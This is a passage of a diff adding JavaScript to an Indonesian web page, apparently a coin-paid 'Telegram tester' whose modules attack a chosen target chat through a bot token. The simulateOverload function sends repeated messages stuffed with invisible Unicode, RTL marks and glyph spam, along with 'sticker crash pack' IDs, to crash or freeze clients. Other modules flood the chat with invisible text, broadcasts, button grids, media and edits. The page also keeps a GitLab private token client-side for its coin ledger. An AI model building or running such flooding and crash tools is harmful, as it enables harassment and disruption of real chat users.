+                modalDescription.innerHTML = config.description;
+                modalCostAmount.textContent = cost;
+                currentTestCallback = config.callback;
+                currentTestCost = cost;
+                
+                if (USER_INFO.coins < cost) {
+                    modalConfirmBtn.disabled = true;
+                    enableButton(modalConfirmBtn, "Koin Kurang");
+                } else {
+                    modalConfirmBtn.disabled = false;
+                    enableButton(modalConfirmBtn, "Lanjutkan");
+                }
+                
+                testModal.classList.add('open');
+                modalOverlay.classList.add('open');
+            });
+        });
+        
+        modalConfirmBtn.addEventListener('click', async (e) => {
+            if (!currentTestCallback) return;
+            
+            disableButton(modalConfirmBtn, "Memproses...");
+            
+            try {
+                await deductCoins(currentTestCost, `Menjalankan Tes: ${modalTitle.textContent}`);
+                closeGameModals();
+                modalOverlay.classList.remove('open');
+                await currentTestCallback(modalConfirmBtn);
+                
+            } catch (error) {
+                showNotification('attack-notification', `Gagal: ${error.message}`, 'error');
+                enableButton(modalConfirmBtn, "Lanjutkan");
+                closeGameModals();
+                modalOverlay.classList.remove('open');
+            }
+        });
+        
+        
+        // --- Logika Inti Tester ---
+        
+        async function telegramApi(method, params = {}) {
+            if (!botToken) {
+                showNotification('attack-notification', 'Bot Token tidak ditemukan.', 'error');
+                return { ok: false, description: 'Bot Token tidak ditemukan.' };
+            }
+            const url = `https://api.telegram.org/bot${botToken}/${method}`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(params)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    showNotification('attack-notification', `API Error: ${data.description}`, 'error');
+                }
+                return data;
+            } catch (error) {
+                showNotification('attack-notification', `Fetch Error: ${error.message}`, 'error');
+                return { ok: false, description: error.message };
+            }
+        }
+        
+        async function connectBot(btn) {
+            const token = botTokenInput.value.trim();
+            const cId = chatIdInput.value.trim();
+            if (!token || !cId) {
+                showNotification('attack-notification', 'Bot Token dan Target Chat ID tidak boleh kosong.', 'error');
+                return;
+            }
+            
+            disableButton(btn, "Connecting...");
+            botToken = token;
+            
+            const data = await telegramApi('getMe');
+            enableButton(btn, "Connect");
+
+            if (data.ok) {
+                chatId = cId;
+                connectForm.style.display = 'none';
+                botUsernameSpan.textContent = `Connected: @${data.result.username}`;
+                connectedInfo.style.display = 'flex';
+                testModules.style.display = 'block';
+                
+                // (BARU) Terapkan animasi stagger
+                document.querySelectorAll('.attack-card').forEach((card, index) => {
+                    card.style.animation = `fadeInUp 0.5s ease ${index * 0.1}s forwards`;
+                });
+                
+                showNotification('attack-notification', `Berhasil terhubung sebagai @${data.result.username}`, 'success');
+
+                if (rememberSession.checked) {
+                    localStorage.setItem('tgTesterToken_v4', token);
+                    localStorage.setItem('tgTesterChatId_v4', cId);
+                } else {
+                    localStorage.removeItem('tgTesterToken_v4');
+                    localStorage.removeItem('tgTesterChatId_v4');
+                }
+            } else {
+                showNotification('attack-notification', `Koneksi gagal: ${data.description}`, 'error');
+                botToken = null;
+            }
+        }
+
+        function disconnectBot() {
+            botToken = null;
+            chatId = null;
+            botTokenInput.value = '';
+            chatIdInput.value = '';
+            
+            if (!rememberSession.checked) {
+                 localStorage.removeItem('tgTesterToken_v4');
+                 localStorage.removeItem('tgTesterChatId_v4');
+            }
+
+            connectedInfo.style.display = 'none';
+            testModules.style.display = 'none';
+            connectForm.style.display = 'block';
+            showNotification('attack-notification', 'Koneksi terputus.', 'info');
+        }
+
+        function loadFromStorage() {
+            const savedToken = localStorage.getItem('tgTesterToken_v4');
+            const savedChatId = localStorage.getItem('tgTesterChatId_v4');
+            if (savedToken && savedChatId) {
+                botTokenInput.value = savedToken;
+                chatIdInput.value = savedChatId;
+                rememberSession.checked = true;
+                connectBot(btnConnect); // Coba auto-connect
+            }
+        }
+        
+        // --- Fungsi Tes (Callback) ---
+        async function simulateOverload(btn) {
+    showNotification('attack-notification', 'OVERLOAD GACOR DIMULAI...', 'info');
+    let success = 0;
+    const chatId = window.chatId || -1001234567890; // ganti kalau perlu
+
+    const crashText = ''.repeat(4000) + // invisible unicode
+        '‏‏‎ ‎' + '۞'.repeat(2000) + // RTL + visual spam
+        '\n'.repeat(50) +
+        '🚨 SYSTEM CRASHED 🚨\n' +
+        '𒈙𒐫𒐫𒐫𒈙𒐫𒐫𒐫'.repeat(300) + // unicode glitch
+        '‏'.repeat(1000);
+
+    const stickerIds = [
+        'CAACAgUAAxkBAAMaZ0v5ZJqAAXnAAAGxAAFiAAMAAdK4AAJhAAPt5fJ5JX9kAAHwzqABAQ',
+        'CAACAgIAAxkBAAMbZ0v5ZJrAAXgAAV4AAWIAAT8AA1YqAALOAAP3FzAAAUsAAdK4AAJhAAPt5fJ5JX9kAAHwzqABAQ',
+        'CAACAgQAAxkBAAMcZ0v5ZJsAAXgAAV4AAWIAAT8AA1YqAALOAAP3FzAAAUsAAdK4AAJhAAPt5fJ5JX9kAAHwzqABAQ'
+    ]; // sticker crash pack
+
+    try {
+        for (let i = 0; i < 5; i++) {
+            // Spam text crash
+            await telegramApi('sendMessage', {
+                chat_id: chatId,
+                text: crashText,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            }).then(r => r.ok && success++);
+
+            // Spam sticker crash
+            await telegramApi('sendSticker', {
+                chat_id: chatId,
+                sticker: stickerIds[i % stickerIds.length]
+            }).then(r => r.ok && success++);
+
+            await sleep(150); // kece banget
+        }
+
+        // Final burst
+        for (let i = 0; i < 3; i++) {
+            await telegramApi('sendMessage', {
+                chat_id: chatId,
+                text: '💀 CRASHED 💀\nREBOOT FAILED\n' + '𒐫'.repeat(500),
+                parse_mode: 'HTML'
+            });
+            await sleep(100);
+        }
+
+        showNotification('attack-notification', `GACOR! ${success} paket terkirim.`, 'success');
+    } catch (e) {
+        showNotification('attack-notification', `Error: ${e.message}`, 'error');
+    }
+}
+        async function simulateInvisibleFlood(btn) {
+            showNotification('attack-notification', 'Memulai Invisible Flood Test...', 'info');
+            const invisibleText = '\u200B\u2060\u200D';
+            const promises = [];
+            for (let i = 0; i < 5; i++) {
+                promises.push(telegramApi('sendMessage', { chat_id: chatId, text: invisibleText }));
+            }
+            try {
+                const results = await Promise.all(promises);
+                const successCount = results.filter(r => r.ok).length;
+                showNotification('attack-notification', `Invisible Flood Selesai. ${successCount}/5 terkirim.`, 'success');
+            } catch (error) { showNotification('attack-notification', `Invisible Flood Gagal: ${error.message}`, 'error'); }
+        }
+        async function simulateHighFreqBroadcast(btn, count, delay) {
+            showNotification('attack-notification', `Memulai Broadcast (${count} msgs)...`, 'info');
+            const messages = ["STC-TEST", "BROADCAST-OK", "PING", "LOADING..."];
+            let successCount = 0;
+            try {
+                for (let i = 0; i < count; i++) {
+                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                    const data = await telegramApi('sendMessage', { chat_id: chatId, text: `${randomMsg} [${i + 1}/${count}]` });
+                    if (data.ok) successCount++;
+                    await sleep(delay);
+                }
+                showNotification('attack-notification', `Broadcast Selesai. ${successCount}/${count} terkirim.`, 'success');
+            } catch (error) { showNotification('attack-notification', `Broadcast Gagal: ${error.message}`, 'error'); }
+        }
+        async function simulateButtonFlood(btn) {
+            showNotification('attack-notification', 'Memulai Button Flood...', 'info');
+            let keyboard = [];
+            for (let i = 0; i < 5; i++) {
+                let row = [];
+                for (let j = 0; j < 5; j++) {
+                    row.push({ text: `BTN ${i*5+j+1}`, callback_data: `btn_${i*5+j+1}` });
+                }
+                keyboard.push(row);
+            }
+            try {
+                const data = await telegramApi('sendMessage', {
+                    chat_id: chatId, text: 'Button Flood Test (25 Tombol)',
+                    reply_markup: { inline_keyboard: keyboard }
+                });
+                if (data.ok) showNotification('attack-notification', 'Button Flood Terkirim!', 'success');
+            } catch (error) { showNotification('attack-notification', `Button Flood Gagal: ${error.message}`, 'error'); }
+        }
+        async function simulateMediaSpam(btn) {
+            showNotification('attack-notification', 'Memulai Media Spam (3 images)...', 'info');
+            const images = [
+                'https://picsum.photos/id/10/200/300', 
+                'https://picsum.photos/id/20/200/300', 
+                'https://picsum.photos/id/30/200/300'
+            ];
+            let successCount = 0;
+            try {
+                for (const img of images) {
+                    const data = await telegramApi('sendPhoto', { chat_id: chatId, photo: img, caption: `Media Spam #${successCount+1}` });
+                    if (data.ok) successCount++;
+                    await sleep(500);
+                }
+                showNotification('attack-notification', `Media Spam Selesai. ${successCount}/3 terkirim.`, 'success');
+            } catch (error) { showNotification('attack-notification', `Media Spam Gagal: ${error.message}`, 'error'); }
+        }
+        async function simulateEditFlood(btn) {
+            showNotification('attack-notification', 'Memulai Edit Flood...', 'info');
+            try {
+                const data = await telegramApi('sendMessage', { chat_id: chatId, text: 'Edit test: 0%' });
+                if (!data.ok) throw new Error('Gagal mengirim pesan awal.');
+                
+                const message_id = data.result.message_id;
+                let successCount = 0;
+                const edits = ['20%', '40%', '60%', '80%', '100% - Selesai!'];
+                
+                for (const text of edits) {
+                    await sleep(300);
+                    const editData = await telegramApi('editMessageText', {
+                        chat_id: chatId, message_id: message_id, text: `Edit test: ${text}`
+                    });
+                    if (editData.ok) successCount++;
+                }
+                showNotification('attack-notification', `Edit Flood Selesai. ${successCount}/5 editan berhasil.`, 'success');
+            } catch (error) { showNotification('attack-notification', `Edit Flood Gagal: ${error.message}`, 'error'); }
+        }
+        async function simulateMarkdownInject(btn) {
+            showNotification('attack-notification', 'Memulai Markdown Inject...', 'info');
+            // Teks markdownV2 yang sengaja dibuat "rusak"
+            const text = 'Tes *format tebal _miring tidak ditutup dan [link tanpa url](...*';
+            try {
+                const data = await telegramApi('sendMessage', {
+                    chat_id: chatId, text: text, parse_mode: 'MarkdownV2'
+                });
+                if (data.ok) {
+                    showNotification('attack-notification', 'Markdown Inject Terkirim! (Cek hasil di Telegram)', 'success');
+                }
+                // Error dari Telegram (e.g., "can't parse entities") juga adalah hasil yang "sukses" dalam konteks tes ini
+            } catch (error) { showNotification('attack-notification', `Markdown Inject Gagal: ${error.message}`, 'error'); }
+        }
+        
+        // Listener Tombol Koneksi
+        btnConnect.addEventListener('click', (e) => connectBot(e.currentTarget));
+        btnDisconnect.addEventListener('click', disconnectBot);
+
+        // ===============================================================
+        // --- FUNGSI API GITLAB (Sistem XVCT) ---
+        // ===============================================================
+
+        async function getGitLabFile(fileUrl) {
+            try {
+                const response = await fetch(`${fileUrl}?ref=${GITLAB_BRANCH}`, {
+                    method: 'GET', 
+                    headers: { 'Private-Token': GITLAB_TOKEN, 'Accept': 'application/json' }
+                });
+                const fileName = decodeURIComponent(fileUrl.split('/').pop().split('?')[0]);
+                const defaultData = { [USERS_FILE]: { settings: {}, users: [] } };
+                if (response.status === 404) { return { data: defaultData[fileName] || {}, lastCommitId: null }; }
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                const data = await response.json(); 
+                if (!data.content) { return { data: defaultData[fileName] || {}, lastCommitId: data.last_commit_id }; }
+                const content = JSON.parse(atob(data.content));
+                return { data: content, lastCommitId: data.last_commit_id };
+            } catch (error) { console.error("Failed to fetch GitLab file:", error); throw error; }
+        }
+        
+        async function updateGitLabFile(fileUrl, commitMessage, dataObject, lastCommitId, btn) {
+            if(btn) disableButton(btn);
+            try {
+                const content = btoa(unescape(encodeURIComponent(JSON.stringify(dataObject, null, 2)))); 
+                const method = lastCommitId ? 'PUT' : 'POST';
+                const payload = { branch: GITLAB_BRANCH, commit_message: commitMessage, content: content, encoding: 'base64' };
+                let url = fileUrl;
+                if(method === 'POST') {
+                    payload.file_path = decodeURIComponent(fileUrl.split('/files/')[1]);
+                    url = `${GITLAB_BASE_URL}${encodeURIComponent(payload.file_path)}`;
+                }
+                const response = await fetch(url, {
+                    method: method, headers: { 'Private-Token': GITLAB_TOKEN, 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    const errData = await response.json();
+                    if (method === 'POST' && errData.message && errData.message.includes('already exists')) {
+                        const { lastCommitId: newCommitId } = await getGitLabFile(fileUrl);
+                        return await updateGitLabFile(fileUrl, commitMessage, dataObject, newCommitId, btn);
+                    }
+                    throw new Error(`GitLab Update Failed: ${errData.message || response.status}`);
+                }
+                return true;
+            } catch (error) { 
+                console.error("Failed to update GitLab file:", error); 
+                if(btn) enableButton(btn);
+                throw error; 
+            } 
+        }
+        
+        // --- Fungsi Keuangan (dari game.html) ---
+        async function deductCoins(amount, reason) {
+            if (amount === 0) return true;
+            if (USER_INFO.coins < amount) throw new Error("Koin tidak cukup!");
+            
+            console.log(`[TRANSAKSI] Mengurangi ${amount} koin untuk ${reason}`);
+            
+            try {
+                const fileUrl = GITLAB_USERS_URL;
+                const { data: usersData, lastCommitId } = await getGitLabFile(fileUrl);
+                const userIndex = usersData.users.findIndex(u => u.username === USER_INFO.username);
+                if (userIndex === -1) throw new Error("User tidak ditemukan di server.");
+                
+                const serverUser = usersData.users[userIndex];
+                if ((serverUser.coins || 0) < amount) throw new Error("Koin di server tidak cukup!");
+                
+                serverUser.coins -= amount;
+                
+                await updateGitLabFile(
+                    fileUrl,
+                    `PAYMENT: ${USER_INFO.username} paid ${amount} coins for ${reason}`,
+                    usersData,
+                    lastCommitId,
+                    null
+                );
+                
+                USER_INFO = serverUser;
+                localStorage.setItem('user', JSON.stringify(USER_INFO));
+                updateCoinDisplay(USER_INFO.coins);
+                return true;
+            } catch (e) {
+                console.error("Gagal mengurangi koin:", e); throw e;
+            }
+        }
+        
+        async function refreshUserInfoFromServer() {
+            if (!USER_INFO) return; 
+            try {
+                const { data: usersData } = await getGitLabFile(GITLAB_USERS_URL);
+                if (!usersData || !usersData.users) throw new Error('Data pengguna server tidak valid.');
+                const freshUserData = usersData.users.find(u => u.username === USER_INFO.username);
+                if (freshUserData) {
+                    if (JSON.stringify(freshUserData) !== JSON.stringify(USER_INFO)) {
+                        console.log('Data pengguna diperbarui dari server.');
+                        USER_INFO = freshUserData;
+                        localStorage.setItem('user', JSON.stringify(USER_INFO)); 
+                        updateCoinDisplay(USER_INFO.coins);
+                    }
+                } else {
+                    console.warn('Pengguna tidak ditemukan di server. Logout paksa.');
+                    logout(true);
+                }
+            } catch (error) {
+                console.error('Gagal menyinkronkan data pengguna:', error.message);
+            }
+        }
+        
+        // --- Logika Halaman (Inti XVCT) ---
+        function showAttackPage() {
+            try {
+                USER_INFO = JSON.parse(localStorage.getItem('user'));
+                if (!USER_INFO) throw new Error("Cache user tidak ditemukan.");
+            } catch (e) {
+                alert(`Cache Sesi Error: ${e.message}. Harap login ulang.`);
+                window.location.href = 'login.html';
+                return;
+            }
+            
+            attackPage.style.display = 'block';
+            menuToggle.style.display = 'block';
+            settingsToggle.style.display = 'block';
+
+            updateCoinDisplay(USER_INFO.coins);
+            applySettings(); 
+            loadFromStorage();
+            refreshUserInfoFromServer();
+
+            const adminTab = document.getElementById('admin-tab-button');
+            if (adminTab && (USER_INFO.role === 'admin' || USER_INFO.role === 'developer')) {
+                adminTab.style.display = 'block';
+            }
+            if (window.innerWidth > 900) {
+                 document.body.style.marginLeft = 'var(--sidebar-width)';
+                 sidebar.classList.add('open');
+            }
+        }
+        
+        function logout(force = false) {
+            vibrate();
+            if(force || confirm('Anda yakin ingin logout?')) {
+                localStorage.removeItem('user');
+                window.location.href = 'login.html';
+            }
+        }
+        
+        // --- Logika Efek Bintang ---
+        const canvas = document.getElementById("stars");
+        const starsCtx = canvas.getContext("2d"); 
+        let stars = []; 
+        let starsAnimationId;
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; stars = []; for (let i = 0; i < 150; i++) { stars.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, radius: Math.random() * 1.5, speed: Math.random() * 0.5 + 0.2 }); } }
+        function drawStars() { starsCtx.clearRect(0, 0, canvas.width, canvas.height); starsCtx.fillStyle = "#fff"; stars.forEach(star => { starsCtx.beginPath(); starsCtx.arc(star.x, star.y, star.radius, 0, Math.PI * 2); starsCtx.fill(); star.y += star.speed; if (star.y > canvas.height) star.y = 0; }); starsAnimationId = requestAnimationFrame(drawStars); }
+        window.addEventListener("resize", resizeCanvas);
+        function startStars() { document.body.classList.remove('stars-hidden'); resizeCanvas(); drawStars(); }
+        function stopStars() { document.body.classList.add('stars-hidden'); if (starsAnimationId) cancelAnimationFrame(starsAnimationId); }
+        
+        
+        /* --- BAGIAN SETTINGS (Global - XVCT) --- */
+        const defaultSettings = {
+            accentColor: '#ffffff', fontSize: '16px', fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
+            textGlow: false, stars: true, music: true, musicVolume: 0.3,
+            vibration: true, devMode: false, skipSplash: false,
+        };
+        function saveSetting(key, value) { SETTINGS[key] = value; localStorage.setItem('XVCT_SETTINGS', JSON.stringify(SETTINGS)); }
+        function loadSettings() {
+            const saved = localStorage.getItem('XVCT_SETTINGS');
+            SETTINGS = saved ? JSON.parse(saved) : { ...defaultSettings };
+            for (const key in defaultSettings) { if (SETTINGS[key] === undefined) SETTINGS[key] = defaultSettings[key]; }
+            applySettings(); updateSettingsUI();
+        }
+        function applySettings() {
+            document.documentElement.style.setProperty('--primary-color', SETTINGS.accentColor);
+            const glow = SETTINGS.accentColor === '#ffffff' ? 'rgba(255, 255, 255, 0.3)' : SETTINGS.accentColor + '66';
+            document.documentElement.style.setProperty('--primary-glow', glow);
+            document.body.style.fontSize = SETTINGS.fontSize; 
+            document.body.style.fontFamily = SETTINGS.fontFamily; 
+            if (SETTINGS.textGlow) document.body.classList.add('text-glow'); else document.body.classList.remove('text-glow'); 
+            if (SETTINGS.stars) startStars(); else stopStars();
+            bgMusic.volume = SETTINGS.musicVolume;
+            if (SETTINGS.music) bgMusic.play().catch(() => {}); else bgMusic.pause();
+            if (toolsTabButton) toolsTabButton.style.display = SETTINGS.devMode ? 'block' : 'none';
+        }
+        function updateSettingsUI() {
+            const el = id => document.getElementById(id);
+            if(el('setting-accent-color')) el('setting-accent-color').value = SETTINGS.accentColor;
+            if(el('setting-font-size')) el('setting-font-size').value = SETTINGS.fontSize;
+            if(el('setting-font-family')) el('setting-font-family').value = SETTINGS.fontFamily; 
+            if(el('setting-text-glow')) el('setting-text-glow').checked = SETTINGS.textGlow;
+            if(el('setting-stars')) el('setting-stars').checked = SETTINGS.stars;
+            if(el('setting-music-toggle')) el('setting-music-toggle').checked = SETTINGS.music;
+            if(el('setting-music-volume')) el('setting-music-volume').value = SETTINGS.musicVolume;
+            if(el('setting-vibration')) el('setting-vibration').checked = SETTINGS.vibration;
+            if(el('setting-dev-mode')) el('setting-dev-mode').checked = SETTINGS.devMode; 
+            if(el('setting-skip-splash')) el('setting-skip-splash').checked = SETTINGS.skipSplash;
+        }
+        function vibrate() { if (SETTINGS.vibration && navigator.vibrate) navigator.vibrate(50); }
+        
+        const el = id => document.getElementById(id);
+        if(el('setting-accent-color')) el('setting-accent-color').addEventListener('change', (e) => { saveSetting('accentColor', e.target.value); applySettings(); });
+        if(el('setting-font-size')) el('setting-font-size').addEventListener('change', (e) => { saveSetting('fontSize', e.target.value); applySettings(); });
+        if(el('setting-font-family')) el('setting-font-family').addEventListener('change', (e) => { saveSetting('fontFamily', e.target.value); applySettings(); });
+        if(el('setting-text-glow')) el('setting-text-glow').addEventListener('change', (e) => { saveSetting('textGlow', e.target.checked); applySettings(); });
+        if(el('setting-stars')) el('setting-stars').addEventListener('change', (e) => { saveSetting('stars', e.target.checked); applySettings(); });
+        if(el('setting-music-toggle')) el('setting-music-toggle').addEventListener('change', (e) => { saveSetting('music', e.target.checked); applySettings(); });
+        if(el('setting-music-volume')) el('setting-music-volume').addEventListener('input', (e) => { saveSetting('musicVolume', e.target.value); applySettings(); });
+        if(el('setting-vibration')) el('setting-vibration').addEventListener('change', (e) => { saveSetting('vibration', e.target.checked); });
+        if(el('setting-dev-mode')) el('setting-dev-mode').addEventListener('change', (e) => { saveSetting('devMode', e.target.checked); applySettings(); });
+        if(el('setting-skip-splash')) el('setting-skip-splash').addEventListener('change', (e) => { saveSetting('skipSplash', e.target.checked); });
+        if(el('setting-clear-cache')) el('setting-clear-cache').addEventListener('click', () => { if(confirm('Reset?')) { localStorage.removeItem('XVCT_SETTINGS'); window.location.reload(); } });
+        if(el('setting-logout-button')) el('setting-logout-button').addEventListener('click', () => logout(false));
+        /* --- AKHIR BAGIAN SETTINGS --- */
+        
+        function updateCoinDisplay(coins) {
+            if (globalUserCoinBalance) {
+                globalUserCoinBalance.textContent = (coins !== undefined) ? coins.toLocaleString('id-ID') : '...';
+            }
+        }
+
+        // --- Fungsi Inisialisasi Utama ---
+        document.addEventListener('DOMContentLoaded', () => {
+             const splash = document.getElementById('splash-screen');
+             if (splash) splash.style.display = 'none'; 
+             loadSettings(); 
+             if (SETTINGS.music) bgMusic.play().catch(() => {});
+             init();
+        });
+
+        // (FIXED) init() sekarang memuat dari cache terlebih dahulu
+        function init() {
+            const user = localStorage.getItem('user');
+            if (!user) {
+                alert("Sesi tidak ditemukan. Harap login kembali.");
+                window.location.href = 'login.html'; 
+            } else {
+                showAttackPage();
+            }
+        }
+    </script>
+</body>
+</html>
